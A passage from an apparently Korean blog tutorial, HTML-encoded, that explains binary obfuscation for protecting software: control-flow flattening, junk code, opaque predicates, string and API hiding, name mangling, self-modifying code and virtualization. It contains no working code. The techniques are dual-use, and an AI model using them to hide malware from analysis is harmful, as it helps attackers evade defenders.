&#xC0BD;&#xC785;&#x201D;, &#x201C;&#xB124;&#xC784; &#xB9F9;&#xAE00;&#xB9C1;&#x201D;, &#x201C;&#xAC04;&#xC811; &#xC810;&#xD504; &#xBC0F; &#xD638;&#xCD9C;&#x201D; &#xB4F1;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="1-4-&#xBC14;&#xC774;&#xB108;&#xB9AC;-&#xB09C;&#xB3C5;&#xD654;"><a href="#1-4-&#xBC14;&#xC774;&#xB108;&#xB9AC;-&#xB09C;&#xB3C5;&#xD654;" class="headerlink" title="1.4 &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xB09C;&#xB3C5;&#xD654;"></a>1.4 &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xB09C;&#xB3C5;&#xD654;</h3><p>&#xC774;&#xBC88; &#xD30C;&#xD2B8;&#xC5D0;&#xC11C;&#xB294; &#xD2B9;&#xBCC4;&#xD788; <strong>&#xBC14;&#xC774;&#xB108;&#xB9AC; &#xB09C;&#xB3C5;&#xD654;</strong>&#xC5D0; &#xC9D1;&#xC911;&#xD558;&#xB824; &#xD569;&#xB2C8;&#xB2E4;. &#xC65C; &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xB09C;&#xB3C5;&#xD654;&#xAC00; &#xC911;&#xC694;&#xD55C;&#xAC00;? &#xBB3C;&#xC73C;&#xC2E0;&#xB2E4;&#xBA74;, &#xC774;&#xC720;&#xB294; &#xAC04;&#xB2E8;&#xD569;&#xB2C8;&#xB2E4;.  &#xC6B0;&#xB9AC;&#xAC00; &#xC4F0;&#xB294; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xB300;&#xBD80;&#xBD84;&#xC740; &#xACB0;&#xAD6D; <strong>&#xBC14;&#xC774;&#xB108;&#xB9AC;</strong> &#xD615;&#xD0DC;&#xB85C; &#xC81C;&#xACF5;&#xB418;&#xB294;&#xB370;, &#xC5EC;&#xAE30;&#xC5D4; &#xAC1C;&#xBC1C;&#xC0AC;&#xC758; &#xD575;&#xC2EC; &#xB178;&#xD558;&#xC6B0;, &#xC54C;&#xACE0;&#xB9AC;&#xC998;, &#xB77C;&#xC774;&#xC120;&#xC2A4; &#xC815;&#xBCF4; &#xB4F1;&#xC774; &#xB2F4;&#xACA8;&#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC785;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xBCF4;&#xD638;&#xD558;&#xC9C0; &#xC54A;&#xC73C;&#xBA74; &#xD06C;&#xB798;&#xD0B9;, &#xBD88;&#xBC95; &#xC7AC;&#xBC30;&#xD3EC;, &#xC2EC;&#xC9C0;&#xC5B4; &#xC545;&#xC131;&#xCF54;&#xB4DC; &#xC545;&#xC6A9;&#xAE4C;&#xC9C0; &#xC774;&#xC5B4;&#xC838; &#xB2E8;&#xC21C;&#xD55C; &#xAE30;&#xC220;&#xC801; &#xACF5;&#xACA9;&#xC744; &#xB118;&#xC5B4; &#xC2EC;&#xAC01;&#xD55C; &#xBE44;&#xC988;&#xB2C8;&#xC2A4; &#xD53C;&#xD574;&#xB97C; &#xC57C;&#xAE30;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB807;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xD544;&#xC694;&#xD55C;&#xAC8C; Anti-Reversing &#xAE30;&#xBC95;&#xC774;&#xACE0; &#xC6B0;&#xB9AC;&#xB294; &#xADF8;&#xC5D0; &#xB300;&#xD574;&#xC11C; Part 1&#xBD80;&#xD130; &#xACC4;&#xC18D; &#xBD10;&#xC624;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xC548;&#xD2F0; &#xB514;&#xBC84;&#xAE45;&#xC774; &#xB3D9;&#xC801; &#xBD84;&#xC11D;, &#xC989; &#xC2E4;&#xD589; &#xC911;&#xC778; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC758; &#xB0B4;&#xBD80;&#xB97C; &#xB4E4;&#xC5EC;&#xB2E4;&#xBCF4;&#xB824;&#xB294; &#xC2DC;&#xB3C4;&#xB97C; &#xC801;&#xADF9;&#xC801;&#xC73C;&#xB85C; &#xAC10;&#xC9C0;&#xD558;&#xACE0; &#xBC29;&#xD574;&#xD55C;&#xB2E4;&#xBA74;, &#xB09C;&#xB3C5;&#xD654;&#xB294; <strong>&#xC815;&#xC801; &#xBD84;&#xC11D;</strong>&#xC744; &#xBC29;&#xD574;&#xD558;&#xB294; &#xB370; &#xCD08;&#xC810;&#xC744; &#xB9DE;&#xCDA5;&#xB2C8;&#xB2E4;. &#xC774; &#xB458;&#xC774; &#xACB0;&#xD569;&#xB420; &#xACBD;&#xC6B0;, &#xBD84;&#xC11D;&#xC790; &#xC785;&#xC7A5;&#xC5D0;&#xC11C;&#xB294; &#xADF8;&#xC57C;&#xB9D0;&#xB85C; &#xBB34;&#xC801;&#xACFC; &#xAC19;&#xC740; &#xBC29;&#xC5B4; &#xCCB4;&#xACC4;&#xB97C; &#xB9C8;&#xC8FC;&#xD558;&#xAC8C; &#xB418;&#xB294; &#xC148;&#xC774;&#xC8E0;.</p><p><img src="image.png" alt="image.png"></p><blockquote><p><del>(&#xC808;&#xB300; &#xB6AB;&#xB9AC;&#xC9C0; &#xC54A;&#xB294; &#xBC29;&#xD328;&#xB3C4; &#xB6AB;&#xB294; &#xCC3D;&#xC774; &#xC788;&#xAE34; &#xD558;&#xC8E0;&#x2026;)</del></p></blockquote><h2 id="2-&#xBC14;&#xC774;&#xB108;&#xB9AC;-&#xB09C;&#xB3C5;&#xD654;&#xC758;-&#xC138;-&#xAC00;&#xC9C0;-&#xCD95;"><a href="#2-&#xBC14;&#xC774;&#xB108;&#xB9AC;-&#xB09C;&#xB3C5;&#xD654;&#xC758;-&#xC138;-&#xAC00;&#xC9C0;-&#xCD95;" class="headerlink" title="2.&#xBC14;&#xC774;&#xB108;&#xB9AC; &#xB09C;&#xB3C5;&#xD654;&#xC758; &#xC138; &#xAC00;&#xC9C0; &#xCD95;"></a>2.&#xBC14;&#xC774;&#xB108;&#xB9AC; &#xB09C;&#xB3C5;&#xD654;&#xC758; &#xC138; &#xAC00;&#xC9C0; &#xCD95;</h2><p>&#xBC14;&#xC774;&#xB108;&#xB9AC; &#xB09C;&#xB3C5;&#xD654;&#xB294; &#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; &#xB2E4;&#xC74C; &#xC138; &#xAC00;&#xC9C0; &#xCE74;&#xD14C;&#xACE0;&#xB9AC;&#xB85C; &#xBD84;&#xB958;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>(&#xC77C;&#xBD80;&#xBD84;&#xC740; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xC9DA;&#xACE0; &#xB118;&#xC5B4;&#xAC00;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.)</p><h3 id="2-1-&#xAD6C;&#xC870;&#xC801;-&#xB09C;&#xB3C5;&#xD654;-Structural-Obfuscation"><a href="#2-1-&#xAD6C;&#xC870;&#xC801;-&#xB09C;&#xB3C5;&#xD654;-Structural-Obfuscation" class="headerlink" title="2.1 &#xAD6C;&#xC870;&#xC801; &#xB09C;&#xB3C5;&#xD654; (Structural Obfuscation)"></a>2.1 &#xAD6C;&#xC870;&#xC801; &#xB09C;&#xB3C5;&#xD654; (Structural Obfuscation)</h3><blockquote><p>&#xCF54;&#xB4DC;&#xC758; &#xC81C;&#xC5B4; &#xD750;&#xB984; &#xAD6C;&#xC870; &#xC790;&#xCCB4;&#xB97C; &#xB4A4;&#xD2C0;&#xC5B4; &#xBD84;&#xC11D;&#xC774; &#xC5B4;&#xB824;&#xC6CC;&#xC9C0;&#xAC8C; &#xB9CC;&#xB4DC;&#xB294; &#xB09C;&#xB3C5;&#xD654;</p></blockquote><p>&#xC774; &#xBC94;&#xC8FC;&#xB294; &#xC8FC;&#xB85C; <strong>&#xC815;&#xC801; &#xBD84;&#xC11D; &#xB3C4;&#xAD6C;&#xAC00; &#xD568;&#xC218;&#xB098; &#xBE14;&#xB85D; &#xB2E8;&#xC704;&#xB85C; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xBD84;&#xC11D;&#xD560; &#xB54C;</strong>, &#xAD6C;&#xC870;&#xB97C; &#xD30C;&#xC545;&#xD558;&#xAE30; &#xC5B4;&#xB835;&#xB3C4;&#xB85D; &#xB9CC;&#xB4ED;&#xB2C8;&#xB2E4;.</p><ul><li><p><strong>&#xC81C;&#xC5B4; &#xD750;&#xB984; &#xD3C9;&#xD0C4;&#xD654; (Control Flow Flattening)</strong></p><p>  <img src="image%205.png" alt="ref. https://gosecure.github.io/presentations/2020-05-15-advanced-binary-analysis/"></p><p>  ref. <a href="https://gosecure.github.io/presentations/2020-05-15-advanced-binary-analysis/">https://gosecure.github.io/presentations/2020-05-15-advanced-binary-analysis/</a></p><ul><li>&#xC6D0;&#xB798;&#xB294; <code>if</code>, <code>while</code>, <code>switch</code> &#xB4F1;&#xC73C;&#xB85C; &#xD45C;&#xD604;&#xB418;&#xB358; &#xB17C;&#xB9AC; &#xD750;&#xB984;&#xC744;, &#xBAA8;&#xB450; &#xD558;&#xB098;&#xC758; <code>dispatcher</code> &#xB8E8;&#xD504; &#xC548;&#xC5D0; &#xB123;&#xACE0;, <strong>&#xC0C1;&#xD0DC; &#xBCC0;&#xC218;</strong>&#xB97C; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xB2E4;&#xC74C; &#xC2E4;&#xD589;&#xD560; &#xBE14;&#xB85D;&#xC744; &#xACB0;&#xC815;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xBC14;&#xAFC9;&#xB2C8;&#xB2E4;.<ul><li>&#xBAA8;&#xB4E0; &#xD750;&#xB984;&#xC774; &#xB8E8;&#xD504; &#xB0B4;&#xBD80;&#xC758; &#xC0C1;&#xD0DC; &#xC804;&#xC774;&#xB85C; &#xD45C;&#xD604;&#xB418;&#xC5B4; &#xC815;&#xC801; &#xBD84;&#xC11D; &#xB3C4;&#xAD6C;&#xC758; &#xD750;&#xB984; &#xD2B8;&#xB9AC; &#xBD84;&#xD574;&#xAC00; &#xBB34;&#xB825;&#xD654;&#xB429;&#xB2C8;&#xB2E4;.</li><li>&#xB530;&#xB77C;&#xC11C; &#xD750;&#xB984;&#xC774; &#xBE44;&#xC9C1;&#xAD00;&#xC801;&#xC73C;&#xB85C; &#xBCC0;&#xACBD;&#xB418;&#xC5B4;, &#xC2E4;&#xC81C; &#xC2E4;&#xD589; &#xACBD;&#xB85C;&#xB97C; &#xCD94;&#xC801;&#xD558;&#xAE30; &#xC5B4;&#xB824;&#xC6CC;&#xC9D1;&#xB2C8;&#xB2E4;.</li></ul></li><li>&#xC774; &#xBD80;&#xBD84;&#xC740; &#xB4A4;&#xC5D0;&#xC11C; Obfuscator-LLVM(OLLVM) &#xC608;&#xC81C;&#xB97C; &#xD1B5;&#xD574; &#xC0B4;&#xD3B4;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</li></ul></li><li><strong>&#xAC00;&#xC9DC; &#xCF54;&#xB4DC; &#xC0BD;&#xC785; (Junk / Dead Code Insertion)</strong><ul><li>&#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC758; &#xC2E4;&#xC81C; &#xB3D9;&#xC791;&#xC5D0;&#xB294; &#xC544;&#xBB34;&#xB7F0; &#xC601;&#xD5A5;&#xC774; &#xC5C6;&#xB294; &#xC758;&#xBBF8; &#xC5C6;&#xB294; &#xCF54;&#xB4DC;(Junk Code)&#xB098;, &#xC2E4;&#xC81C;&#xB85C;&#xB294; &#xC808;&#xB300; &#xC2E4;&#xD589;&#xB418;&#xC9C0; &#xC54A;&#xB294; &#xCF54;&#xB4DC;(Dead Code)&#xB97C; &#xC0BD;&#xC785;&#xD558;&#xB294; &#xAE30;&#xBC95;&#xC785;&#xB2C8;&#xB2E4;.</li><li>&#xB300;&#xD45C;&#xC801;&#xC778; &#xC608;&#xB85C;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;:<ul><li>&#xC758;&#xBBF8; &#xC5C6;&#xB294; &#xC5F0;&#xC0B0; (<code>x = x;</code>, <code>add eax, 0;</code>)</li><li>&#xC2E4;&#xD589;&#xB418;&#xC9C0; &#xC54A;&#xB294; &#xBD84;&#xAE30; (<code>if (false) { ... }</code>)</li></ul></li></ul></li><li><strong>&#xAC04;&#xC811; &#xBD84;&#xAE30; / &#xD638;&#xCD9C; (Indirect Branching)</strong><ul><li><code>jmp eax</code>, <code>call [ecx+0x10]</code>&#xCC98;&#xB7FC; &#xC8FC;&#xC18C; &#xACC4;&#xC0B0; &#xD6C4; &#xC810;&#xD504;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xC774;&#xB85C;&#xC368; &#xCF54;&#xB4DC; &#xD750;&#xB984;&#xC744; &#xCD94;&#xC801;&#xD560; &#xC218; &#xC5C6;&#xAC8C; &#xB9CC;&#xB4ED;&#xB2C8;&#xB2E4;(API &#xCD94;&#xB860; &#xBD88;&#xAC00;).</li></ul></li><li><strong>Opaque Predicate</strong><ul><li>&#xC870;&#xAC74;&#xC2DD;&#xC774; &#xD56D;&#xC0C1; true/false&#xC778; &#xBD84;&#xAE30; &#xC0BD;&#xC785;&#xD569;&#xB2C8;&#xB2E4;. (&#xC608;: <code>if ((x*x) &gt;= 0)</code>)</li><li>&#xC774; &#xCF54;&#xB4DC;&#xB294; &#xB3D9;&#xC801;&#xC73C;&#xB85C;&#xB294; &#xBB34;&#xD574;&#xD558;&#xB098; &#xC815;&#xC801;&#xC73C;&#xB85C;&#xB294; &#xD750;&#xB984; &#xBD84;&#xC11D;&#xC744; &#xBC29;&#xD574;&#xD569;&#xB2C8;&#xB2E4;.</li></ul></li><li><strong>&#xC8FC;&#xC758;&#xD560; &#xC810;:</strong><ul><li>&#xCEF4;&#xD30C;&#xC77C; &#xC2DC; &#xCD5C;&#xC801;&#xD654; &#xC635;&#xC158;(<code>O2</code>, <code>O3</code>)&#xC744; &#xC8FC;&#xBA74; &#xAD6C;&#xC870;&#xAC00; &#xCD5C;&#xC801;&#xD654; &#xB418;&#xBA74;&#xC11C; &#xC758;&#xBBF8; &#xC5C6;&#xB294; &#xCF54;&#xB4DC;&#xB4E4;&#xC774; &#xC81C;&#xAC70;&#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>&#xB530;&#xB77C;&#xC11C; &#xB09C;&#xB3C5;&#xD654; &#xC2DC;&#xC5D0;&#xB294; <strong>&#xCD5C;&#xC801;&#xD654; &#xC635;&#xC158;&#xC744; &#xBE44;&#xD65C;&#xC131;&#xD654;</strong>&#xD558;&#xAC70;&#xB098;, <strong>&#xB7F0;&#xD0C0;&#xC784; &#xBCC0;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xC81C;&#xAC70;&#xB97C; &#xBC29;&#xC9C0;&#xD558;&#xB294; &#xAE30;&#xBC95;</strong>&#xC744; &#xD568;&#xAED8; &#xC801;&#xC6A9;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</li></ul></li><li><p><strong>&#xD6A8;&#xACFC;:</strong></p><ul><li><p>&#xBD84;&#xC11D;&#xC790;&#xB294; &#xBD88;&#xD544;&#xC694;&#xD55C; &#xB8E8;&#xD504;&#xB098; &#xBD84;&#xAE30; &#xC18D;&#xC5D0; &#xC228;&#xC5B4; &#xC788;&#xB294; &#xC2E4;&#xC81C; &#xCF54;&#xB4DC;&#xB97C; &#xCC3E;&#xC544;&#xC57C; &#xD574;&#xC11C; &#xC2EC;&#xB9AC;&#xC801;&#xC73C;&#xB85C; &#xC9C0;&#xCE58;&#xACE0; &#xD5C8;&#xD0C8;&#xD568;&#xC744; &#xB290;&#xB07C;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xC67C;&#xCABD; &#xC0AC;&#xC9C4;&#xCC98;&#xB7FC; &#xC0DD;&#xAE34; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC758; &#xD750;&#xB984;&#xC5D0;&#xC11C; &#xC624;&#xB978;&#xCABD; &#xC544;&#xB798;&#xC758; &#xB354;&#xBBF8;&#xCF54;&#xB4DC;&#xB97C; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xBA87; &#xBD80;&#xBD84;&#xB9CC; &#xB123;&#xC5B4;&#xB3C4; &#xC624;&#xB978;&#xCABD;&#xACFC; &#xAC19;&#xC774; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC758; &#xD750;&#xB984;&#xC774; &#xB354; &#xBCF5;&#xC7A1;&#xD574;&#xC9D0;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>  <img src="image%206.png" alt="image.png"></p></li></ul></li></ul><p>&#x1F50D; <em>&#xAD6C;&#xC870;&#xC801; &#xB09C;&#xB3C5;&#xD654;&#xB294; &#xC8FC;&#xB85C; &#xBD84;&#xC11D; &#xB3C4;&#xAD6C;&#xC758; CFG &#xBD84;&#xC11D;&#xACFC; &#xD750;&#xB984; &#xD30C;&#xC545;&#xC744; &#xBB34;&#xB825;&#xD654;&#xD569;&#xB2C8;&#xB2E4;.</em></p><h3 id="2-2-&#xB370;&#xC774;&#xD130;-&#xB09C;&#xB3C5;&#xD654;-Data-Obfuscation"><a href="#2-2-&#xB370;&#xC774;&#xD130;-&#xB09C;&#xB3C5;&#xD654;-Data-Obfuscation" class="headerlink" title="2.2 &#xB370;&#xC774;&#xD130; &#xB09C;&#xB3C5;&#xD654; (Data Obfuscation)"></a>2.2 &#xB370;&#xC774;&#xD130; &#xB09C;&#xB3C5;&#xD654; (Data Obfuscation)</h3><blockquote><p>&#xB370;&#xC774;&#xD130; &#xC790;&#xCCB4;&#xB97C; &#xC228;&#xAE30;&#xAC70;&#xB098; &#xB2E4;&#xB974;&#xAC8C; &#xD45C;&#xD604;&#xD558;&#xC5EC; &#xC758;&#xBBF8;&#xB97C; &#xC720;&#xCD94;&#xD558;&#xAE30; &#xC5B4;&#xB835;&#xAC8C; &#xB9CC;&#xB4DC;&#xB294; &#xB09C;&#xB3C5;&#xD654;</p></blockquote><p>&#xC774; &#xBC94;&#xC8FC;&#xB294; &#xC8FC;&#xB85C; &#xBB38;&#xC790;&#xC5F4;, &#xC0C1;&#xC218;, API &#xBA85; &#xB4F1; <strong>&#xBD84;&#xC11D; &#xC2DC; &#xC720;&#xC6A9;&#xD55C; &#xB2E8;&#xC11C;</strong>&#xB97C; &#xC81C;&#xAC70;&#xD558;&#xAC70;&#xB098; &#xC228;&#xAE30;&#xAE30; &#xC704;&#xD55C; &#xAE30;&#xBC95;&#xC785;&#xB2C8;&#xB2E4;.</p><ul><li><strong>&#xBB38;&#xC790;&#xC5F4; &#xC554;&#xD638;&#xD654; (String Encryption)</strong><ul><li>&#xC911;&#xC694;&#xD55C; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xB7F0;&#xD0C0;&#xC784; &#xBCF5;&#xD638;&#xD654; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xC804;&#xD658;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xC815;&#xC801; &#xBD84;&#xC11D; &#xC2DC; <code>&quot;CreateProcess&quot;</code> &#xAC19;&#xC740; &#xBB38;&#xC790;&#xC5F4;&#xC774; &#xBCF4;&#xC774;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul></li><li><strong>&#xC0C1;&#xC218; &#xC778;&#xCF54;&#xB529; (Constant Encoding)</strong><ul><li>&#xC22B;&#xC790; &#xC0C1;&#xC218;&#xB098; &#xD50C;&#xB798;&#xADF8; &#xAC12;&#xC744; &#xAC04;&#xC811; &#xACC4;&#xC0B0;&#xC73C;&#xB85C; &#xD45C;&#xD604;&#xD569;&#xB2C8;&#xB2E4;. (&#xC608;: <code>1337</code> &#x2192; <code>1000 + 337</code>)</li><li>&#xC774;&#xB85C;&#xC368; &#xC989;&#xAC01;&#xC801;&#xC73C;&#xB85C; &#xC0C1;&#xC218;&#xC758; &#xC758;&#xBBF8;&#xB97C; &#xD30C;&#xC545;&#xD560; &#xC218; &#xC5C6;&#xAC8C; &#xB418;&#xACE0;, &#xD2B9;&#xD788; &#xB514;&#xCEF4;&#xD30C;&#xC77C;&#xB41C; &#xCF54;&#xB4DC;&#xAC00; &#xC0B0;&#xC220;&#xC2DD;&#xC73C;&#xB85C; &#xBCF5;&#xC7A1;&#xD558;&#xAC8C; &#xD45C;&#xD604;&#xB418;&#xBA74;&#xC11C; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC758; &#xBAA9;&#xC801;&#xC774;&#xB098; &#xC0C1;&#xD0DC;&#xB97C; &#xC720;&#xCD94;&#xD558;&#xB294; &#xB370; &#xAC78;&#xB9AC;&#xB294; &#xC2DC;&#xAC04;&#xC744; &#xB300;&#xD3ED; &#xC99D;&#xAC00;&#xC2DC;&#xD0B5;&#xB2C8;&#xB2E4;.</li></ul></li><li><strong>API &#xD638;&#xCD9C; &#xB09C;&#xB3C5;&#xD654; / Import Hiding</strong><ul><li>API &#xC774;&#xB984;&#xC744; &#xD574;&#xC2DC;&#xB098; &#xC554;&#xD638;&#xD654;&#xB85C; &#xC228;&#xAE30;&#xACE0;, &#xB7F0;&#xD0C0;&#xC784;&#xC5D0; &#xB3D9;&#xC801; &#xB85C;&#xB529;(<code>LoadLibrary</code>, <code>GetProcAddress</code>)&#xD569;&#xB2C8;&#xB2E4;.</li><li>IAT(Import Address Table)&#xAC00; &#xBB34;&#xB825;&#xD654;&#xB418;&#xC5B4; &#xC790;&#xB3D9; &#xBD84;&#xC11D; &#xBD88;&#xAC00;&#xD569;&#xB2C8;&#xB2E4;.</li></ul></li></ul><p>&#x1F50D; <em>&#xB370;&#xC774;&#xD130; &#xB09C;&#xB3C5;&#xD654;&#xB294; &#xBD84;&#xC11D;&#xC790;&#xB098; &#xB3C4;&#xAD6C;&#xAC00; &#xC758;&#xBBF8; &#xC788;&#xB294; &#xC815;&#xBCF4;(&#xC2DD;&#xBCC4;&#xC790;, &#xBB38;&#xC790;&#xC5F4;, API &#xB4F1;)&#xB97C; &#xCD94;&#xCD9C;&#xD558;&#xB294; &#xAC83;&#xC744; &#xBC29;&#xD574;&#xD569;&#xB2C8;&#xB2E4;.</em></p><h3 id="2-3-&#xC54C;&#xACE0;&#xB9AC;&#xC998;-&#xB09C;&#xB3C5;&#xD654;-Algorithm-Obfuscation"><a href="#2-3-&#xC54C;&#xACE0;&#xB9AC;&#xC998;-&#xB09C;&#xB3C5;&#xD654;-Algorithm-Obfuscation" class="headerlink" title="2.3 &#xC54C;&#xACE0;&#xB9AC;&#xC998; &#xB09C;&#xB3C5;&#xD654; (Algorithm Obfuscation)"></a>2.3 &#xC54C;&#xACE0;&#xB9AC;&#xC998; &#xB09C;&#xB3C5;&#xD654; (Algorithm Obfuscation)</h3><blockquote><p>&#xC2E4;&#xC81C; &#xAE30;&#xB2A5;&#xC774;&#xB098; &#xB85C;&#xC9C1;&#xC744; &#xBCF5;&#xC7A1;&#xD558;&#xAC8C; &#xB9CC;&#xB4E4;&#xC5B4; &#xAE30;&#xB2A5;&#xC744; &#xD30C;&#xC545;&#xD558;&#xAE30; &#xC5B4;&#xB835;&#xAC8C; &#xB9CC;&#xB4DC;&#xB294; &#xB09C;&#xB3C5;&#xD654;</p></blockquote><p>&#xC774;&#xB294; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xC218;&#xD589;&#xD558;&#xB294; <strong>&#xD589;&#xC704; &#xC790;&#xCCB4;</strong>&#xB97C; &#xB09C;&#xD574;&#xD558;&#xAC8C; &#xD558;&#xC5EC;, &#xCF54;&#xB4DC;&#xB97C; &#xB72F;&#xC5B4;&#xBD10;&#xB3C4; &#x201C;&#xBB34;&#xC5C7;&#xC744; &#xD558;&#xB294;&#xC9C0;&#x201D;&#xB97C; &#xC54C;&#xAE30; &#xC5B4;&#xB835;&#xAC8C; &#xB9CC;&#xB4ED;&#xB2C8;&#xB2E4;.</p><ul><li><p><strong>&#xB124;&#xC784; &#xB9F9;&#xAE00;&#xB9C1; (Name Mangling) &#xBC0F; &#xC2EC;&#xBCFC; &#xC81C;&#xAC70;</strong></p><ul><li>&#xB514;&#xBC84;&#xAE45; &#xC2EC;&#xBCFC;&#xC744; &#xC81C;&#xAC70;&#xD558;&#xAC70;&#xB098;, &#xD568;&#xC218;/&#xBCC0;&#xC218; &#xC774;&#xB984;&#xC744; &#xBB34;&#xC791;&#xC704; &#xBB38;&#xC790;&#xC5F4;&#xB85C; &#xB300;&#xCCB4;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xC774;&#xB85C;&#xC368; &#xC804;&#xCCB4;&#xC801;&#xC778; &#xAE30;&#xB2A5; &#xB9E5;&#xB77D;&#xC744; &#xC77D;&#xAE30; &#xC5B4;&#xB835;&#xAC8C; &#xD569;&#xB2C8;&#xB2E4;.</li><li><p>&#xB2E4;&#xC74C;&#xC740; Hack The Drone 2024(Final) &#xC5D0; &#xB098;&#xC628; &#xBB38;&#xC81C; &#xC911; &#xD328;&#xD0B7;&#xC744; &#xC778;&#xCF54;&#xB529;&#xD574;&#xC11C; &#xBE44;&#xD589;&#xC744; &#xC704;&#xD55C; &#xC2DC;&#xB3D9; &#xD328;&#xD0B7;&#xC744; &#xB9CC;&#xB4DC;&#xB294; &#xBB38;&#xC81C;&#xC758; &#xC77C;&#xBD80;&#xBD84;&#xC785;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xBB38;&#xC81C;&#xC5D0;&#xC11C;&#xB294; &#xC218;&#xB3C4; &#xB79C;&#xB364; &#xC0DD;&#xC131;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; LFSR Galois &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC744; &#xC774;&#xC6A9;&#xD588;&#xB294;&#xB370;&#xC694;.</p><p><img src="image%207.png" alt="image.png"></p></li><li><p>&#xC704; &#xC0AC;&#xC9C4;&#xC744; &#xBCF4;&#xC2DC;&#xBA74; &#xD568;&#xC218; &#xC774;&#xB984;&#xC744; &#xD1B5;&#xD574; &#xC5B4;&#xB5A4; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC774; &#xC801;&#xC6A9;&#xB418;&#xC5C8;&#xB294;&#xC9C0;&#xB791; &#xAC01;&#xAC01;&#xC758; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB4E4;&#xC774; &#xC5B4;&#xB5BB;&#xAC8C; &#xCC98;&#xB9AC;&#xAC00; &#xB418;&#xB294;&#xC9C0; &#xC27D;&#xAC8C; &#xD30C;&#xC545;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="image%208.png" alt="image.png"></p></li><li><p>&#xADF8;&#xB7EC;&#xB098; &#xB124;&#xC784; &#xB9F9;&#xAE00;&#xB9C1;&#xC774; &#xC801;&#xC6A9;&#xB418;&#xBA74; &#xC704;&#xC640; &#xAC19;&#xC774; &#xD568;&#xC218;&#xBA85;&#xACFC; &#xD30C;&#xB77C;&#xBBF8;&#xD130; &#xBCC0;&#xC218;&#xBA85;&#xC774; &#xBB34;&#xC791;&#xC704; &#xBB38;&#xC790;&#xC5F4;&#xB85C; &#xB300;&#xCCB4;&#xB418;&#xC5B4; &#xC804;&#xCCB4;&#xC801;&#xC73C;&#xB85C; &#xC5B4;&#xB5A4; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC778;&#xC9C0; &#xD30C;&#xC545;&#xD558;&#xB294;&#xB370; &#xC2DC;&#xAC04;&#xC774; &#xBCF4;&#xB2E4; &#xC18C;&#xC694;&#xB429;&#xB2C8;&#xB2E4;.</p><ul><li>&#xC694;&#xC998;&#xC5D0;&#xB294; &#xADF8;&#xB7F0;&#xB370; GPT &#xAC19;&#xC740; LLM&#xC5D0; &#xB123;&#xC5B4;&#xC8FC;&#xBA74; &#xB108;&#xBB34; &#xC798; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC744; &#xD30C;&#xC545;&#xD574;&#xC8FC;&#xAE34; &#xD558;&#xB354;&#xB77C;&#xAD6C;&#xC694; &#x314E;.&#x314E;&#x2026;</li></ul></li></ul></li><li><strong>Self-Modifying Code</strong><ul><li>&#xC2E4;&#xD589; &#xC911; &#xC790;&#xC2E0;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0;&#xC11C; &#xC218;&#xC815;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xB530;&#xB77C;&#xC11C; &#xC815;&#xC801; &#xBD84;&#xC11D;&#xC73C;&#xB85C;&#xB294; &#xC644;&#xC804;&#xD55C; &#xCF54;&#xB4DC; &#xAD6C;&#xC870;&#xB97C; &#xBCFC; &#xC218; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul></li><li><strong>&#xAC00;&#xC0C1; &#xBA38;&#xC2E0; &#xAE30;&#xBC18; &#xB09C;&#xB3C5;&#xD654; (Virtualization Obfuscation)</strong><ul><li>&#xC790;&#xCCB4; &#xAC00;&#xC0C1; ISA&#xB97C; &#xB9CC;&#xB4E4;&#xC5B4; &#xC6D0;&#xB798; 